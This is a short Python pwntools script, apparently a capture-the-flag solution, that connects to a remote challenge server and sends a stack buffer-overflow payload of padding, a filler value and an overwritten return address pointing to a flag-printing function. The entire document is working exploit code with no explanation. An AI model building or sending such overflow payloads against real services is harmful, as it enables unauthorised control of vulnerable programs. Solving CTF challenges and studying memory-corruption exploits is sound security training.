from pwn import *

def exploit():
    target = "pwn-ctf.cyberspace.ma"
    port = 8002
       
    flag_func_addr = 0x401186    

    payload = b"A" * 72
    payload += p64(0xdeadbeefcafebabe)  
    payload += b"B" * 8         
    payload += p64(flag_func_addr)   

    p = remote(target, port)
    p.send(payload)    
    print(p.recvall())

if __name__ == "__main__":
    exploit()
